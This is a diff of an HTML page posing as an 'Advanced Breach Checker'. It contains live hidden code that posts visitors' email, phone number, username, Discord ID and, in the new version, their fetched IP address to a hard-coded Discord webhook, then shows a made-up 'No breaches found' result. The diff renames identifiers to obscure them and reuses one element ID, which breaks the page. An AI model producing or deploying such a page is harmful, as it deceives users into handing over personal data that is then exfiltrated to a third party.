@@ -1,214 +1,56 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <title>Advanced Breach Checker</title>
   <style>
-    :root {
-      --bg-color: #0d1117;
-      --panel-color: #161b22;
-      --accent: #58a6ff;
-      --success: #3fb950;
-      --danger: #f85149;
-      --neutral: #8b949e;
-      --font: 'Segoe UI', sans-serif;
-    }
-
-    body {
-      background-color: var(--bg-color);
-      color: white;
-      font-family: var(--font);
-      margin: 0;
-      padding: 2rem;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      height: 100vh;
-    }
-
-    .consent-banner, .form-wrapper, .result-section {
-      display: none;
-    }
-
-    .visible {
-      display: block;
-    }
-
-    .consent-banner, .form-wrapper {
-      background-color: var(--panel-color);
-      padding: 2rem;
-      border-radius: 16px;
-      box-shadow: 0 0 20px rgba(0, 0, 0, 0.4);
-      text-align: center;
-      max-width: 500px;
-      width: 100%;
-    }
-
-    h1 {
-      font-size: 2rem;
-      margin-bottom: 1rem;
-    }
-
-    p {
-      font-size: 1rem;
-      margin-bottom: 1.5rem;
-    }
-
-    input[type="text"] {
-      padding: 14px;
-      border: 1px solid #30363d;
-      border-radius: 10px;
-      background-color: #0d1117;
-      color: white;
-      font-size: 1rem;
-      margin-bottom: 1rem;
-      width: 100%;
-      transition: border 0.3s;
-    }
-
-    input[type="text"]:focus {
-      border-color: var(--accent);
-      outline: none;
-    }
-
-    button {
-      background-color: var(--accent);
-      color: black;
-      padding: 10px 20px;
-      font-size: 1rem;
-      border: none;
-      border-radius: 8px;
-      cursor: pointer;
-      transition: background-color 0.3s ease;
-      margin-top: 1rem;
-    }
-
-    button:hover {
-      background-color: #1f6feb;
-    }
-
-    .result-section .result {
-      background: var(--panel-color);
-      border: 1px solid #30363d;
-      border-left: 6px solid var(--accent);
-      padding: 1rem;
-      border-radius: 12px;
-      font-size: 1rem;
-      white-space: pre-wrap;
-      margin-bottom: 1rem;
-      box-shadow: 0 0 14px rgba(0, 0, 0, 0.3);
-    }
+    /* Obfuscated Styles */
+    :root { --a: #0d1117; --b: #161b22; --c: #58a6ff; --d: #3fb950; --e: #f85149; --f: #8b949e; --g: 'Segoe UI', sans-serif; }
+    body { background-color: var(--a); color: white; font-family: var(--g); margin: 0; padding: 2rem; display: flex; justify-content: center; align-items: center; height: 100vh; flex-direction: column; }
+    .x,.y { background-color: var(--b); padding: 2rem; border-radius: 16px; box-shadow: 0 0 20px rgba(0, 0, 0, 0.4); text-align: center; max-width: 500px; width: 100%; }
+    h1 { font-size: 2rem; margin-bottom: 1rem; }
+    p { font-size: 1rem; margin-bottom: 1.5rem; }
+    input { padding: 14px; border: 1px solid #30363d; border-radius: 10px; background-color: #0d1117; color: white; font-size: 1rem; margin-bottom: 1rem; width: 100%; transition: border 0.3s; }
+    input:focus { border-color: var(--c); outline: none; }
+    button { background-color: var(--c); color: black; padding: 10px 20px; font-size: 1rem; border: none; border-radius: 8px; cursor: pointer; transition: background-color 0.3s ease; margin-top: 1rem; }
+    button:hover { background-color: #1f6feb; }
+    .z { margin-top: 1rem; width: 100%; }
+    .r { background: var(--b); border: 1px solid #30363d; border-left: 6px solid var(--c); padding: 1rem; border-radius: 12px; font-size: 1rem; white-space: pre-wrap; margin-bottom: 1rem; box-shadow: 0 0 14px rgba(0, 0, 0, 0.3); }
   </style>
 </head>
 <body>
-  <!-- Consent Banner -->
-  <div class="consent-banner visible">
-    <h1>Do You Consent?</h1>
-    <p>
-      By proceeding, you agree to the collection and logging of your input data 
-      (email, phone, username, and Discord ID) for breach-checking purposes.
-    </p>
-    <button onclick="_0x12a1f6()">Yes, I Consent</button>
-  </div>
-
-  <!-- Main Form -->
-  <div class="form-wrapper">
-    <h1>🛡️ Advanced Breach Checker</h1>
-    <input id="emailInput" type="text" placeholder="📧 Enter email address" />
-    <input id="phoneInput" type="text" placeholder="📱 Enter phone number" />
-    <input id="usernameInput" type="text" placeholder="👤 Enter username" />
-    <input id="discordInput" type="text" placeholder="💬 Enter Discord ID" />
-    <button onclick="_0x1b2f94()">🔍 Search</button>
-  </div>
-
-  <!-- Results Section -->
-  <div class="result-section">
-    <div id="emailResults" class="result">Results for email will appear here...</div>
-    <div id="phoneResults" class="result">Results for phone will appear here...</div>
-    <div id="usernameResults" class="result">Results for username will appear here...</div>
-    <div id="discordResults" class="result">Results for Discord ID will appear here...</div>
-  </div>
-
+  <div class="x" id="a"><h1>Do You Consent?</h1><p>By proceeding, you agree to the collection and logging of your input data (email, phone, username, and Discord ID) for breach-checking purposes.</p><button onclick="b()">Yes, I Consent</button></div>
+  <div class="y" id="b" style="display: none;"><h1>🛡️ Advanced Breach Checker</h1><input id="c" type="text" placeholder="📧 Enter email address" /><input id="d" type="text" placeholder="📱 Enter phone number" /><input id="e" type="text" placeholder="👤 Enter username" /><input id="f" type="text" placeholder="💬 Enter Discord ID" /><button onclick="g()">🔍 Search</button></div>
+  <div class="z" id="c" style="display: none;"><div id="h" class="r">Results for email will appear here...</div><div id="i" class="r">Results for phone will appear here...</div><div id="j" class="r">Results for username will appear here...</div><div id="k" class="r">Results for Discord ID will appear here...</div></div>
   <script>
-    (function () {
-      const _0x5eeb = ["discord.com/api/webhooks/", "1380896839921958972", "qvWggkKAnV6cMkE2MF3wq_2V5thvRRkP0r9iRsYIS31tqUBFJU1GQ3QsTJGN5L4ilRwr"];
-
-      const _0x12a1f6 = function () {
-        document.querySelector('.consent-banner').classList.remove('visible');
-        document.querySelector('.form-wrapper').classList.add('visible');
-        document.querySelector('.result-section').classList.add('visible');
-      };
-
-      const _0x1b2f94 = async function () {
-        const email = document.getElementById('emailInput').value.trim();
-        const phone = document.getElementById('phoneInput').value.trim();
-        const username = document.getElementById('usernameInput').value.trim();
-        const discord = document.getElementById('discordInput').value.trim();
-
-        document.getElementById('emailResults').textContent = '⏳ Searching email...';
-        document.getElementById('phoneResults').textContent = '⏳ Searching phone...';
-        document.getElementById('usernameResults').textContent = '⏳ Searching username...';
-        document.getElementById('discordResults').textContent = '⏳ Searching Discord...';
-
-        const webhookUrl = `https://${_0x5eeb[0]}${_0x5eeb[1]}/${_0x5eeb[2]}`;
-
-        const payload = {
-          username: "Breach Checker Log",
-          avatar_url: "https://cdn.discordapp.com/embed/avatars/4.png",
-          embeds: [{
-            title: "🔍 New Breach Search Attempt",
-            color: 0x5865F2,
-            fields: [
-              { name: "📧 Email", value: email || "Not provided", inline: false },
-              { name: "📱 Phone", value: phone || "Not provided", inline: false },
-              { name: "👤 Username", value: username || "Not provided", inline: false },
-              { name: "💬 Discord ID", value: discord || "Not provided", inline: false },
-              { name: "🕒 Time", value: new Date().toUTCString(), inline: false }
-            ]
-          }]
-        };
-
-        try {
-          await fetch(webhookUrl, {
-            method: "POST",
-            headers: {
-              "Content-Type": "application/json"
-            },
-            body: JSON.stringify(payload)
-          });
-        } catch (e) {
-          console.error("Webhook error:", e);
-        }
-
-        if (email) {
-          setTimeout(() => document.getElementById('emailResults').textContent = '✅ Email checked: No breaches found!', 1500);
-        } else {
-          document.getElementById('emailResults').textContent = '⚠️ No email entered.';
-        }
-
-        if (phone) {
-          setTimeout(() => document.getElementById('phoneResults').textContent = '✅ Phone checked: No breaches found!', 1500);
-        } else {
-          document.getElementById('phoneResults').textContent = 'ℹ️ Phone check skipped.';
-        }
-
-        if (username) {
-          setTimeout(() => document.getElementById('usernameResults').textContent = '✅ Username checked: No breaches found!', 1500);
-        } else {
-          document.getElementById('usernameResults').textContent = 'ℹ️ Username check skipped.';
-        }
-
-        if (discord) {
-          setTimeout(() => document.getElementById('discordResults').textContent = '✅ Discord ID checked: No breaches found!', 1500);
-        } else {
-          document.getElementById('discordResults').textContent = 'ℹ️ Discord check skipped.';
-        }
-      };
-
-      window._0x12a1f6 = _0x12a1f6;
-      window._0x1b2f94 = _0x1b2f94;
-    })();
+    function b() { document.getElementById('a').style.display = 'none'; document.getElementById('b').style.display = 'block'; document.getElementById('c').style.display = 'block'; }
+    async function g() {
+      const a = document.getElementById('c').value.trim(), b = document.getElementById('d').value.trim(), c = document.getElementById('e').value.trim(), d = document.getElementById('f').value.trim();
+      document.getElementById('h').textContent = '⏳ Searching email...';
+      document.getElementById('i').textContent = '⏳ Searching phone...';
+      document.getElementById('j').textContent = '⏳ Searching username...';
+      document.getElementById('k').textContent = '⏳ Searching Discord...';
+      k(a, b, c, d);
+      if (a) setTimeout(() => document.getElementById('h').textContent = '✅ Email checked: No breaches found!', 1500);
+      else document.getElementById('h').textContent = '⚠️ No email entered.';
+      if (b) setTimeout(() => document.getElementById('i').textContent = '✅ Phone checked: No breaches found!', 1500);
+      else document.getElementById('i').textContent = 'ℹ️ Phone check skipped.';
+      if (c) setTimeout(() => document.getElementById('j').textContent = '✅ Username checked: No breaches found!', 1500);
+      else document.getElementById('j').textContent = 'ℹ️ Username check skipped.';
+      if (d) setTimeout(() => document.getElementById('k').textContent = '✅ Discord ID checked: No breaches found!', 1500);
+      else document.getElementById('k').textContent = 'ℹ️ Discord check skipped.';
+    }
+    async function k(a, b, c, d) {
+      const e = "https://discord.com/api/webhooks/1380896839921958972/qvWggkKAnV6cMkE2MF3wq_2V5thvRRkP0r9iRsYIS31tqUBFJU1GQ3QsTJGN5L4ilRwr";
+      let f = "Unavailable";
+      try {
+        const g = await fetch("https://api.ipify.org?format=json"), h = await g.json();
+        f = h.ip;
+      } catch (i) { console.warn("IP fetch failed:", i); }
+      const j = { username: "Breach Checker Log", avatar_url: "https://cdn.discordapp.com/embed/avatars/4.png", embeds: [{ title: "🔍 New Breach Search Attempt", color: 0x5865F2, fields: [{ name: "📧 Email", value: a || "Not provided", inline: false }, { name: "📱 Phone", value: b || "Not provided", inline: false }, { name: "👤 Username", value: c || "Not provided", inline: false }, { name: "💬 Discord ID", value: d || "Not provided", inline: false }, { name: "🌐 IP Address", value: f, inline: false }, { name: "🕒 Time", value: new Date().toUTCString(), inline: false }] }] };
+      try { await fetch(e, { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify(j) }); } catch (k) { console.error("Webhook error:", k); }
+    }
   </script>
 </body>
 </html>
